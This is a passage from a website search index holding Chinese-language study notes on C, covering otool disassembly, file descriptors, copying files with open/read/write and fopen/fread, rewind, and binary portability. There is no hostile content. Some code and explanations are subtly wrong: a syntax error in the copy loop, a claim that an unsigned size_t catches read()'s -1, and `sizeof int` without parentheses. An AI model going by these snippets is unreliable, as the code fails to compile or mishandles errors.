\u6587\u4ef6\u5185\u90e8\u7ed3\u6784\u7684\u8be6\u7ec6\u67e5\u770b\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u4ee5\u4e0b\u5185\u5bb9\uff1a - \u6587\u4ef6\u5934\u4fe1\u606f - \u5b57\u7b26\u8868 - \u7b26\u53f7\u8868 - \u7a0b\u5e8f\u7684\u6bb5\u3001\u8282\u4fe1\u606f - \u53cd\u6c47\u7f16\u4ee3\u7801</p>"},{"location":"cs/c/4.1/#_5","title":"\u5e38\u7528\u9009\u9879","text":"<ul> <li><code>-t</code>\uff1a\u663e\u793a\u6587\u4ef6\u7684\u6587\u672c\u6bb5\uff0c\u5373\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\u3002\u8fd9\u4f1a\u663e\u793a\u6587\u4ef6\u7684\u53cd\u6c47\u7f16\u4ee3\u7801\u3002</li> <li><code>-v</code>\uff1a\u4ee5\u8be6\u7ec6\u6a21\u5f0f\u8f93\u51fa\u3002</li> <li><code>-V</code>\uff1a\u540c\u65f6\u663e\u793a\u539f\u59cb\u5b57\u8282\u7801\u548c\u6c47\u7f16\u6307\u4ee4\u3002</li> <li><code>| less</code>\uff1a\u7ba1\u9053\u64cd\u4f5c\uff0c\u5c06\u8f93\u51fa\u901a\u8fc7 <code>less</code> \u5206\u9875\u663e\u793a\uff0c\u4fbf\u4e8e\u9010\u9875\u67e5\u770b\u957f\u8f93\u51fa\u5185\u5bb9\u3002</li> </ul>"},{"location":"cs/c/4.1/#_6","title":"\u793a\u4f8b\u89e3\u8bfb","text":"<p><pre><code>otool -tvV /bin/ls | less\n</code></pre> \u8fd9\u6761\u547d\u4ee4\u7684\u542b\u4e49\u662f\uff1a 1. \u4f7f\u7528 <code>otool</code> \u5bf9 <code>/bin/ls</code>\uff08ls \u547d\u4ee4\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff09\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u67e5\u770b\u5176\u4e2d\u7684\u673a\u5668\u7801\u548c\u6c47\u7f16\u6307\u4ee4\u3002 2. \u901a\u8fc7 <code>-t</code> \u9009\u9879\uff0c\u63d0\u53d6\u5176\u6587\u672c\u6bb5\uff0c\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u3002 3. \u4f7f\u7528 <code>-v</code> \u548c <code>-V</code> \u9009\u9879\uff0c\u4ee5\u8be6\u7ec6\u6a21\u5f0f\u8f93\u51fa\u5e76\u5305\u62ec\u539f\u59cb\u5b57\u8282\u7801\u548c\u5bf9\u5e94\u7684\u53cd\u6c47\u7f16\u6307\u4ee4\u3002 4. \u6700\u540e\u901a\u8fc7 <code>less</code> \u547d\u4ee4\u5206\u9875\u663e\u793a\u8f93\u51fa\u5185\u5bb9\uff0c\u65b9\u4fbf\u7528\u6237\u9605\u8bfb\u3002</p>"},{"location":"cs/c/4.1/#otool_1","title":"<code>otool</code> \u7684\u5e94\u7528\u573a\u666f","text":"<ul> <li>\u67e5\u770b Mach-O \u6587\u4ef6\u7684\u7ed3\u6784\uff1a\u5f00\u53d1\u8005\u53ef\u4ee5\u4f7f\u7528 <code>otool</code> \u67e5\u770b macOS \u548c iOS \u5e94\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u6216\u76ee\u6807\u6587\u4ef6\u7684\u8be6\u7ec6\u7ed3\u6784\u4fe1\u606f\u3002</li> <li>\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\uff1a\u901a\u8fc7\u53cd\u6c47\u7f16\u548c\u67e5\u770b\u7b26\u53f7\u8868\uff0c<code>otool</code> \u662f\u8c03\u8bd5\u7a0b\u5e8f\u3001\u5206\u6790\u5e94\u7528\u884c\u4e3a\u3001\u9006\u5411\u5de5\u7a0b\u7b49\u7684\u5e38\u7528\u5de5\u5177\u3002</li> <li>\u4f9d\u8d56\u5206\u6790\uff1a\u5f00\u53d1\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>otool</code> \u5206\u6790\u6587\u4ef6\u6240\u4f9d\u8d56\u7684\u52a8\u6001\u5e93\u548c\u5176\u4ed6\u5916\u90e8\u94fe\u63a5\u3002</li> </ul> <p>\u56e0\u6b64\uff0c<code>otool</code> \u662f macOS \u5f00\u53d1\u8005\u8fdb\u884c\u5e95\u5c42\u5206\u6790\u7684\u91cd\u8981\u5de5\u5177\uff0c\u7c7b\u4f3c\u4e8e Linux \u4e0a\u7684 <code>objdump</code> \u6216 <code>readelf</code>\u3002</p>"},{"location":"cs/c/4.2/","title":"4.2 I/O","text":""},{"location":"cs/c/4.2/#wed-lecture","title":"Wed Lecture","text":"<p>At the lowest level, an operating system will only communicate using bytes, not with higher-level integers or floating-point values. C11 employs arrays of characters to hold the bytes in requests for raw input and output.</p> <p>\u5728\u8bf7\u6c42\u539f\u59cb\u8f93\u5165\u548c\u8f93\u51fa\u65f6\uff0cC11 \u4f1a\u4f7f\u7528\u5b57\u7b26\u6570\u7ec4\u6765\u4fdd\u5b58\u8fd9\u4e9b\u8bf7\u6c42\u4e2d\u7684\u5b57\u8282\u3002\u64cd\u4f5c\u7cfb\u7edf\u53ea\u8ba4\u5b57\u8282\uff0c\u800c\u5b57\u7b26\u6570\u7ec4\u6b63\u662f\u5c06\u6570\u636e\u6253\u5305\u6210\u5b57\u8282\u7684\u5f62\u5f0f\uff0c\u56e0\u6b64\u5b57\u7b26\u6570\u7ec4\u5728\u8fd9\u91cc\u8d77\u5230\u5173\u952e\u4f5c\u7528\u3002</p>"},{"location":"cs/c/4.2/#file-descriptors","title":"File Descriptors","text":"<p>\u5728\u57fa\u4e8e Unix \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u7528\u4e8e\u6807\u8bc6\u5404\u79cd\u901a\u4fe1\u6e20\u9053\u7684\u6574\u6570\u503c\u3002\u8fd9\u4e9b\u6e20\u9053\u53ef\u4ee5\u662f\u6587\u4ef6\u3001\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7ba1\u9053\u3001\u8bbe\u5907\uff0c\u6216\u8005\u7f51\u7edc\u8fde\u63a5\u7b49\u3002\u6587\u4ef6\u63cf\u8ff0\u7b26\u4f5c\u4e3a\u7b80\u5355\u7684\u6574\u6570\u503c\uff0c\u63d0\u4f9b\u4e86\u4e0e\u8fd9\u4e9b\u8d44\u6e90\u7684\u63a5\u53e3\u3002</p> <p>\u5728 C11 \u7f16\u7a0b\u4e2d\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u548c\u5b57\u7b26\u6570\u7ec4\u7ecf\u5e38\u7ec4\u5408\u4f7f\u7528\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u53d1\u51fa\u8f93\u5165\u8f93\u51fa\u8bf7\u6c42\u3002\u4ee5\u6587\u4ef6\u8bfb\u53d6\u4e3a\u4f8b\uff0c\u7a0b\u5e8f\u901a\u8fc7\u6574\u6570\u6587\u4ef6\u63cf\u8ff0\u7b26\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u8981\u8bbf\u95ee\u54ea\u4e2a\u6587\u4ef6\uff0c\u5e76\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u5b58\u5165\u5b57\u7b26\u6570\u7ec4\u4e2d\uff0c\u7cfb\u7edf read \u7ec6\u8282\u53ef\u4ee5\u53c2\u8003 <code>man 2 open</code></p> <p>\u4ee5\u4e0b\u4e3a\u8bfb\u53d6\u6587\u4ef6\u5168\u90e8\u5185\u5bb9\u5b8c\u6574\u4ee3\u7801\uff1a</p> <pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;fcntl.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n\n#define  MYSIZE      10000\n\nvoid read_using_descriptor(char filename[])        \n{\n    // \u5c1d\u8bd5\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\n    int fd = open(filename, O_RDONLY);\n\n    // \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u6210\u529f\u6253\u5f00\n    if(fd == -1) {\n        printf(\"cannot open '%s'\\n\", filename);\n        exit(EXIT_FAILURE);\n    }\n\n    // \u5b9a\u4e49\u5b57\u7b26\u6570\u7ec4\u7528\u4e8e\u4fdd\u5b58\u6587\u4ef6\u5185\u5bb9\n    char buffer[MYSIZE];\n    size_t got;\n\n    // \u591a\u6b21\u8bfb\u53d6\u6587\u4ef6\u76f4\u5230\u6587\u4ef6\u672b\u5c3e\n    while((got = read(fd, buffer, sizeof buffer)) &gt; 0) {\n        write(STDOUT_FILENO, buffer, got);\n    }\n    // \u5f53 read \u51fd\u6570\u8fd4\u56de 0 \u65f6\uff0c\u8868\u793a\u5df2\u7ecf\u5230\u8fbe\u6587\u4ef6\u672b\u5c3e\uff08EOF\uff09\uff0c\u6ca1\u6709\u66f4\u591a\u7684\u6570\u636e\u53ef\u4ee5\u8bfb\u53d6\u3002\u8fd9\u65f6\u5faa\u73af\u6761\u4ef6 got &gt; 0 \u4e0d\u518d\u6ee1\u8db3\uff0c\u5faa\u73af\u9000\u51fa\u3002\n      // \u5982\u679c read \u51fd\u6570\u8fd4\u56de\u8d1f\u503c\uff0c\u5219\u8868\u793a\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5faa\u73af\u4e5f\u4f1a\u9000\u51fa\u3002\n\n    // \u5173\u95ed\u6587\u4ef6\uff0c\u8868\u793a\u4e0d\u518d\u8bbf\u95ee\n    close(fd);\n}\n\nint main() {\n    read_using_descriptor(\"haversine.c\");\n}\n</code></pre> <p>\u5176\u4e2d <code>fcntl.h</code> \u4e3a\u5e95\u5c42\u63d0\u4f9b\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u4e0d\u662f C11 \u7684\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u63d0\u4f9b\u4e86 <code>open</code>, <code>read</code>, <code>close</code> \u7b49\u8d1f\u8d23\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u4ea4\u4e92\u5e76\u6267\u884c\u4f4e\u5c42\u6b21\u7684\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u3002<code>unistd.h</code>\u63d0\u4f9b\u6807\u51c6\u6587\u4ef6\u5378\u8f7d\u51fd\u6570\u7684 close \u6389\u8c03\u7528\u901a\u9053\u540e\u91ca\u653e\u5185\u5b58 </p> <p><code>int fd = open(filename, O_RDONLY)</code> open and read only \u7684\u7f29\u5199\u53ea\u8bfb\uff1b\u5176\u6b21\u6253\u5f00\u6587\u4ef6\u53ef\u80fd\u4f1a\u9047\u5230\u51e0\u79cd\u60c5\u51b5\uff0c\u6587\u4ef6\u4e0d\u5b58\u5728 ENOENT \u6587\u4ef6\u6ca1\u6709\u6743\u9650 EACCESS \u548c\u6587\u4ef6\u7cfb\u7edf\u8fbe\u5230\u6253\u5f00\u6587\u4ef6\u6570\u91cf\u7684\u4e0a\u9650 EMFILE \u6216 ENFILE</p> <p>\u7cfb\u7edf\u6210\u529f\u6253\u5f00\u6587\u4ef6\u540e\u4f1a\u8fd4\u56de\u6b63\u6574\u6570\uff0c\u4e00\u4e2a\u5927\u4e8e 3 \u7684\u503c\uff0c0 1 2 \u5206\u522b\u5c5e\u4e8e <code>stdin</code>, <code>stdout</code>, <code>stderr</code> \u7684\u6807\u51c6\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5f53\u6587\u4ef6\u6253\u5f00\u5931\u8d25\u65f6\uff0copen \u51fd\u6570\u4f1a\u8fd4\u56de -1 </p> <pre><code>if(fd == -1) {\n    printf(\"cannot open '%s'\\n\", filename);\n    exit(EXIT_FAILURE);\n}\n</code></pre> <p>EXIT_FAILURE \u662f\u4e00\u4e2a\u5b8f\uff0c\u5b9a\u4e49\u5728  \u4e2d\uff0c\u5b83\u8868\u793a\u7a0b\u5e8f\u7684\u5f02\u5e38\u9000\u51fa\u6216\u5931\u8d25\u72b6\u6001\u3002\u4f7f\u7528 EXIT_FAILURE \u53ef\u4ee5\u66f4\u52a0\u660e\u786e\u5730\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u7531\u4e8e\u67d0\u79cd\u9519\u8bef\u800c\u9000\u51fa\u3002\u4e0e\u4e4b\u76f8\u5bf9\u7684\u5b8f\u662f EXIT_SUCCESS\uff0c\u8868\u793a\u7a0b\u5e8f\u7684\u6b63\u5e38\u9000\u51fa\u3002 <p>\u4e0e Python \u4e0d\u540c\u7684\u662f C \u9700\u8981\u663e\u793a\u624b\u52a8\u7ba1\u7406\u5185\u5b58\uff0c\u56e0\u6b64\u5e95\u5c42\u7684\u7f13\u51b2\u548c\u5185\u5b58\u7ba1\u7406\u9700\u8981\u624b\u52a8\u7ba1\u7406\uff0c\u6570\u7ec4 buffer \u7684\u4f5c\u7528\u4e3a\u4e34\u65f6\u4fdd\u5b58\u6587\u4ef6\u5185\u5bb9\uff0c\u63d0\u9ad8\u6548\u7387\u5e76\u51cf\u5c11\u7cfb\u7edf\u8c03\u7528\u6b21\u6570\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u5185\u5b58\u5927\u5c0f\uff1a</p> <pre><code>char buffer[1024];\nint fd = open(\"file.txt\", O_RDONLY);\nint bytes_read = read(fd, buffer, sizeof(buffer));\n</code></pre> <p>size_t \u7c7b\u578b\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\u7c7b\u578b\uff0c\u901a\u5e38\u7528\u4e8e\u63cf\u8ff0\u5185\u5b58\u6216\u6570\u636e\u5757\u5927\u5c0f\uff0c\u5728 32 \u4f4d\u7cfb\u7edf\u4e0a\uff0csize_t \u901a\u5e38\u662f 4 \u5b57\u8282\u957f\uff0832 \u4f4d\uff09\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u5b83\u901a\u5e38\u662f 8 \u5b57\u8282\u957f\uff0864 \u4f4d\uff09\u3002\u56e0\u6b64\uff0c\u5b83\u8db3\u591f\u5927\uff0c\u80fd\u591f\u8868\u793a\u7cfb\u7edf\u5185\u5b58\u4e2d\u5bf9\u8c61\u7684\u6700\u5927\u53ef\u80fd\u5927\u5c0f\u3002</p> <pre><code>printf(\"%lu\", got); //2185 \u4e2a\u8bfb\u53d6\u6587\u4ef6 read \u6d41\u5b57\u8282\u6570\n</code></pre> <p>USB \u548c\u7f51\u7edc\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b got \u8fd9\u79cd\u5bb9\u6613\u51fa\u9519</p>"},{"location":"cs/c/4.2/#copy-a-file-using-file-descriptors","title":"Copy a file using file descriptors","text":"<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;fcntl.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n\n#define  MYSIZE      10000\n\nint copy_file(char destination[], char source[])        \n{\n//  ATTEMPT TO OPEN source FOR READ-ONLY ACCESS\n    int fd0    = open(source, O_RDONLY);\n//  ENSURE THE FILE COULD BE OPENED\n    if(fd0 == -1) {\n        return -1;\n    }\n\n//  ATTEMPT TO OPEN destination FOR WRITE-ONLY ACCESS\n    int fd1    = open(destination, O_WRONLY);\n//  ENSURE THE FILE COULD BE OPENED\n    if(fd1 == -1) {\n        close(fd0);\n        return -1;\n    }\n\n//  DEFINE A CHARACTER ARRAY TO HOLD THE FILE'S CONTENTS\n    char   buffer[MYSIZE];\n    size_t got;\n\n//  PERFORM MULTIPLE READs OF FILE UNTIL END-OF-FILE REACHED  \n    while((got = read(fd0, buffer, sizeof buffer)) &gt; 0) {  \n        if(write(fd1, buffer, got)) != got) {  \n            close(fd0); close(fd1);\n            return -1;\n        }\n    }\n\n    close(fd0); close(fd1);\n    return 0;\n}\n</code></pre> <p>\u548c read \u4ee3\u7801\u524d\u671f\u64cd\u4f5c\u4e00\u81f4\uff0c\u9664\u4e86\u53cc open \u64cd\u4f5c\u5728 while \u5faa\u73af\u5904\uff1a</p> <p>\u8fd9\u91cc\u7684 while loop condition \u7684\u903b\u8f91\u662f\uff1awhile \u5faa\u73af\u4f1a\u4e0d\u65ad\u5730\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u5e76\u5199\u5165\u6807\u51c6\u8f93\u51fa\uff0c\u76f4\u5230\u8bfb\u53d6\u5230\u6587\u4ef6\u672b\u5c3e\uff08read \u8fd4\u56de 0\uff09\u6216\u53d1\u751f\u9519\u8bef\uff08read \u8fd4\u56de\u8d1f\u503c\uff09\u3002</p> <p>\u53ea\u8981\u6ee1\u8db3\u8fd9\u4e2a condition \u5c31\u7ee7\u7eed\u8fd0\u884c\uff0c\u4e0d\u6ee1\u8db3\u76f4\u63a5\u9000\u51fa</p> <pre><code>while((got = read(fd0, buffer, sizeof buffer)) &gt; 0) {  \n    if(write(fd1, buffer, got)) != got) {  \n        close(fd0); close(fd1);\n        return -1;\n    }\n}\n</code></pre> <p>read(fd, buffer, sizeof buffer)\uff1a\u4ece\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u6700\u591a\u8bfb\u53d6 sizeof buffer \u5b57\u8282\u7684\u6570\u636e\uff0c\u5e76\u5c06\u8fd9\u4e9b\u6570\u636e\u5b58\u50a8\u5728 buffer \u4e2d\u3002\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u5b9e\u9645\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002write \u51fd\u6570\u5c1d\u8bd5\u5c06 buffer \u4e2d\u7684 got \u5b57\u8282\u6570\u636e\u5199\u5165\u5230 fd1 \u6307\u5b9a\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u5b83\u8fd4\u56de\u5b9e\u9645\u5199\u5165\u7684\u5b57\u8282\u6570\u3002</p> <p>\u8fd9\u4e2a\u6761\u4ef6\u68c0\u67e5 write \u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u5426\u7b49\u4e8e got\u3002\u5982\u679c\u8fd4\u56de\u503c\u4e0d\u7b49\u4e8e got\uff0c\u8bf4\u660e\u5199\u5165\u64cd\u4f5c\u6ca1\u6709\u5b8c\u5168\u6210\u529f\uff08\u53ef\u80fd\u90e8\u5206\u6570\u636e\u6ca1\u6709\u5199\u5165\uff0c\u6216\u8005\u53d1\u751f\u4e86\u9519\u8bef\uff09\u3002</p>"},{"location":"cs/c/4.2/#read-and-writing-text-files","title":"Read and writing text files","text":"<p>\u8bfb\u53d6 txt \u548c\u8bfb\u53d6\uff0c\u5199\u5165 byte \u7684\u65b9\u6cd5\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u662f\u8bfb\u53d6 txt \u4e00\u822c\u90fd\u662f\u4e00\u884c\u4e00\u884c\u7684\u8bfb\u53d6\uff0c\u4e0d\u662f\u7f51\u7edc\u5b57\u8282\u3002\u56e0\u6b64\u7528 std \u5e93\u91cc\u7684 fopen \u548c fclose \u51fd\u6570\u8fdb\u884c\u9ad8\u7ea7\u64cd\u4f5c\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define DICTIONARY      \"/usr/share/dict/words\"\n\n....\n//  ATTEMPT TO OPEN THE FILE FOR READ-ACCESS\n    FILE   *dict = fopen(DICTIONARY, \"r\");\n\n//  CHECK IF ANYTHING WENT WRONG\n    if(dict == NULL) {\n        printf( \"cannot open dictionary '%s'\\n\", DICTIONARY);\n        exit(EXIT_FAILURE);\n    }\n\n//  READ AND PROCESS THE CONTENTS OF THE FILE\n    ....\n\n//  WHEN WE'RE FINISHED, CLOSE THE FILE\n    fclose(dict);\n</code></pre> <p>\u64cd\u4f5c\u53c2\u6570\u4e0e Python \u4e00\u81f4</p> <p>r, r+, w, w+, a, a+</p> <pre><code>FILE   *dict = fopen(DICTIONARY, \"r\");\n</code></pre> <p>\u7528 FILE \u7c7b\u578b\u58f0\u660e\uff0c<code>*</code> \u8868\u660e dict \u662f\u4e00\u4e2a\u6307\u5411 FILE \u7c7b\u578b\u6570\u636e\u7684\u6307\u9488</p> <p>\u6709\u4e9b\u4ee3\u7801\u4e2d\u4f1a\u51fa\u73b0 br \u4e4b\u7c7b\u7684\u7528\u4e8c\u8fdb\u5236\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u8fd9\u79cd\u6807\u5fd7\u53ea\u4f1a\u5728 Windows \u6709\u6548\uff0c\u5176\u4ed6\u7cfb\u7edf\u4f1a\u88ab\u80e1\u54a7\uff0c\u4e3a\u4e0a\u4e2a\u4e16\u7eaa\u9057\u7559\u4e0b\u6765\u7684\u4e00\u4e9b\u8001\u6807\u51c6</p>"},{"location":"cs/c/4.2/#read-txt-line-by-line","title":"Read txt line by line","text":"<pre><code>#include &lt;stdio.h&gt;\n\n....\n    FILE   *dict;\n    char   line[BUFSIZ];\n\n    dict = fopen( ..... );\n    ....\n\n//  READ EACH LINE FROM THE FILE,\n//  CHECKING FOR END-OF-FILE OR AN ERROR\n    while( fgets(line, sizeof line, dict) != NULL ) {  \n        ....\n        ....     // process this line\n        ....\n    }\n//  AT END-OF-FILE (OR AN ERROR), CLOSE THE FILE\n    fclose(dict);\n</code></pre> <p>\u4ece\u68c0\u67e5\u6574\u4f53\u5230\u4e00\u884c\u884c\u68c0\u67e5\uff1a</p> <p>\u7ed3\u679c\u53d1\u73b0\u8bfb\u53d6\u7684\u6bcf\u4e00\u884c\u5b9e\u9645\u4e0a\u7ed3\u5c3e\u90fd\u4f1a\u6709 <code>\\n\\0</code>, \u5728 Windows \u7cfb\u7edf\u4e0a\u751a\u81f3\u8fd8\u591a\u4e00\u4e2a\u56de\u8f66\u7b26\uff1a<code>\\r\\n\\0</code> \u56e0\u6b64\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u5c06\u5176\u66ff\u6362\u4e3a null byte</p> <pre><code>// REMOVE ANY TRAILING end-of-line CHARACTERS FROM THE LINE\nvoid trim_line(char line[])\n{\n    int i = 0;\n\n//  LOOP UNTIL WE REACH THE END OF line\n    while(line[i] != '\\0') {\n\n//  CHECK FOR CARRIAGE-RETURN OR NEWLINE\n        if( line[i] == '\\r' || line[i] == '\\n' ) {\n            line[i] = '\\0'; // overwrite with null-byte\n            break;          // leave the loop early\n        }\n        i = i+1;            // iterate through character array\n    }\n}\n</code></pre> <p>\u4f46\u662f\u8fd9\u6837\u7684\u64cd\u4f5c\u662f\u5bf9 variable \u7684\u526f\u672c\u8fdb\u884c\u7f16\u8f91</p>"},{"location":"cs/c/4.2/#writing-text-output-to-a-file","title":"Writing text output to a file","text":"<p><code>fgets()</code> \u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u4e00\u884c\u6587\u672c\uff0c\u7528 <code>fputs</code> \u5199\u5165\u4e00\u884c\u6587\u672c</p> <p><code>fputs</code> \u7684\u6587\u4ef6\u6307\u9488\u5fc5\u987b\u63d0\u524d\u5df2\u7ecf <code>open</code> for writing \u6216 appending </p>"},{"location":"cs/c/4.2/#copy-a-text-file-using-file-pointers","title":"Copy a text file using file pointers","text":"<p>\u4ee5\u4e0b\u5c31\u662f\u5e26\u6709\u5168\u90e8\u5b8c\u6574\u6b63\u5e38\u529f\u80fd\u7684\u5168\u90e8\u7a0b\u5e8f\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copy_text_file(char destination[], char source[])\n{\n    FILE        *fp_in   = fopen(source, \"r\");\n    FILE        *fp_out  = fopen(destination,  \"w\");\n\n//  ENSURE THAT OPENING BOTH FILES HAS BEEN SUCCESSFUL\n    if(fp_in != NULL &amp;&amp; fp_out != NULL) {\n        char    line[BUFSIZ];\n\n        while( fgets(line, sizeof line, fp_in) != NULL) {  \n            if(fputs(line, fp_out) == EOF) {\n                printf(\"error copying file\\n\");\n                exit(EXIT_FAILURE);\n            }\n        }\n    }\n//  ENSURE THAT WE ONLY CLOSE FILES THAT ARE OPEN\n    if(fp_in != NULL) {\n        fclose(fp_in);\n    }\n    if(fp_out != NULL) {\n        fclose(fp_out);\n    }\n}\n</code></pre> <p>\u7531\u4e8e <code>fputs</code> \u6709 return \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728 if \u8fc7\u7a0b\u4e2d\u5c31\u5df2\u7ecf\u5199\u5165\u8fdb out \u6307\u9488</p>"},{"location":"cs/c/4.2/#reading-and-writing-files-of-binary-data","title":"Reading and writing files of binary data","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copyfile(char destination[], char source[])\n{\n    FILE        *fp_in   = fopen(source, \"rb\");\n    FILE        *fp_out  = fopen(destination,  \"wb\");\n\n//  ENSURE THAT OPENING BOTH FILES HAS BEEN SUCCESSFUL\n    if(fp_in != NULL &amp;&amp; fp_out != NULL) {\n\n        char    buffer[BUFSIZ];\n        size_t  got, wrote;\n\n        while( (got = fread(buffer, 1, sizeof buffer, fp_in)) &gt; 0) {  \n            wrote = fwrite(buffer, 1, got, fp_out);\n            if(wrote != got) {\n                printf(\"error copying files\\n\");\n                exit(EXIT_FAILURE);\n            }\n        }\n\n    }\n\n//  ENSURE THAT WE ONLY CLOSE FILES THAT ARE OPEN\n    if(fp_in != NULL) {\n        fclose(fp_in);\n    }\n    if(fp_out != NULL) {\n        fclose(fp_out);\n    }\n}\n</code></pre> <p>\u64cd\u4f5c\u53c2\u6570\u540e\u52a0\u5165 b \u7136\u540e\u6309\u7167 1 \u5b57\u8282 1 \u5b57\u8282\u7684\u5927\u5c0f\u64cd\u4f5c\u590d\u5236\uff0c\u4e00\u822c\u7528\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u534f\u8bae\u89e3\u5305\uff0c\u8ba9\u6570\u636e\u9879\u5927\u5c0f\u76f8\u540c</p> <pre><code>size_t  fread(void *ptr, size_t eachsize, size_t nelem, FILE *stream);\n</code></pre>"},{"location":"cs/c/4.2/#tape","title":"Tape","text":"<p>Professor \u63d0\u51fa\u4e86\u78c1\u5e26\u64e6\u51fa\u5f55\u5236\u7684\u6982\u5ff5\uff0c\u7528\u5230\u4e86 rewind \u51fd\u6570\u8986\u5199\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint   intarray[ N_ELEMENTS ];\nint   got, wrote;\n\n//  OPEN THE BINARY FILE FOR READING AND WRITING\n    FILE  *fp = fopen(filename, \"rb+\");\n    ....\n\n    got = fread( intarray, sizeof int, N_ELEMENTS, fp);  \n    printf(\"just read in %i ints\\n\", got);\n\n//  MODIFY THE BINARY DATA IN THE ARRAY\n    ....\n\n//  REWIND THE FILE TO ITS BEGINNING\n    rewind(fp);\n\n//  AND NOW OVER-WRITE THE BEGINNING DATA\n    wrote = fwrite( intarray, sizeof int, N_ELEMENTS, fp);  \n    ....\n\n    fclose(fp);\n</code></pre> <p>rewind \u51fd\u6570\u5c06\u7ed9\u5b9a\u7684\u6587\u4ef6\u6d41 stream \u7684\u6587\u4ef6\u4f4d\u7f6e\u6307\u9488\u91cd\u7f6e\u5230\u6587\u4ef6\u7684\u5f00\u5934\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u540e\u7eed\u7684\u6587\u4ef6\u8bfb\u5199\u64cd\u4f5c\u5c06\u4ece\u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u3002</p>"},{"location":"cs/c/4.2/#network","title":"Network","text":"<p>\u5728\u4e0d\u540c\u7684\u786c\u4ef6\u67b6\u6784\u4e0b\u5199\u5165\u548c\u8bfb\u53d6\u51fa\u6765\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7ed3\u679c\u4e0d\u4e00\u6837\uff0c\u8fd9\u4e2a\u95ee\u9898\u5728\u5f80\u8fd4\u4e0d\u540c\u67b6\u6784\u548c\u8de8\u7f51\u7edc\u7684\u65f6\u5019\u9700\u8981\u88ab\u89e3\u51b3\uff0c\u8be6\u7ec6\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u8bfe\u7a0b\u4e2d\u7684\u6570\u636e\u7684\u7ec8\u7ed3\u6027</p> <p>32 \u5954\u817e\u5904\u7406\u5668</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define N     10\n\nint array[N];\n\nfor(int n=0 ; n &lt; N ; ++n) {\n    array[n]  =  n;\n}\n\nfwrite(array, N, sizeof int, fp_out);\n</code></pre> <p>32 PowerPC \u8bfb\u53d6</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define N     10\n\nint array[N];\n\nfread(array, N, sizeof int, fp_in);  \n\nfor(int n=0 ; n &lt; N ; ++n) {\n    printf(\"%i \", array[n]);\n}\nprintf(\"\\n\");\n</code></pre>"},{"location":"cs/c/4.3/","title":"4.3 I/O 